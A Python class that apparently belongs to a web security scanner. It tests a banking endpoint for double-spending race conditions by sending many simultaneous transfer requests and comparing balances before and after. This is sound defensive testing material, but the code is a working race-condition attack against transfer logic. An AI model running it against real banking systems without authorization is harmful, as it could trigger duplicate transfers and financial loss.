import threading
class DoubleSpending():
    def __init__(self, client,auth):
        self.client = client
        self.auth = auth
        self.results = []
        self.lock = threading.Lock()
    def send_transfer(self, sender, receiver, amount):
        response = self.client.post("/bank/doTransfer", data={
            "fromAccount": sender,
            "toAccount": receiver,
            "transferAmount": amount,
            "transfer": "Transfer Money"
        })
        with self.lock:
            if response.status_code == 200:
                self.results.append("SUCCESS")
            else:
                self.results.append("FAIL")

    def run(self, sender="800002", receiver="800003", amount="100", threads=10):
        print(f"Starting Double Spending detection with {threads} concurrent threads...")
        self.results = []

        balance_before = self.auth.get_balance()
        if balance_before is None:
            print("[DOUBLE SPENDING] Could not read starting balance - aborting test.")
            return
        before = float(balance_before.replace("$", "").replace(",", "").strip())

        # Fire many transfers simultaneously
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=self.send_transfer, args=(sender, receiver, amount))
            thread_list.append(t)

        for t in thread_list:
            t.start()
        for t in thread_list:
            t.join()

        balance_after = self.auth.get_balance()
        if balance_after is None:
            print("[DOUBLE SPENDING] Could not read balance - aborting test.")
            return

        after = float(balance_after.replace("$", "").replace(",", "").strip())

        delta = round(before - after, 2)
        expected = float(amount)
        successes = self.results.count("SUCCESS")

        print(f"\n[DOUBLE SPENDING] Analysis:")
        print(f"Threads fired       : {threads}")
        print(f"Requests succeeded  : {successes}/{threads}")
        print(f"Balance before      : {balance_before}")
        print(f"Balance after       : {balance_after}")
        print(f"Amount per transfer : ${amount}")
        print(f"Expected deduction  : ${expected} (1 transfer)")
        print(f"Actual deduction    : ${delta}")

        if delta > expected:
            times = round(delta / expected)
            print(f"\nVULNERABILITY DETECTED - Balance dropped {times}x the transfer amount!")
            print(f"Server processed {times} out of {threads} concurrent transfers.")
        else:
            print(f"\nSAFE - Balance only dropped once despite {threads} concurrent requests.")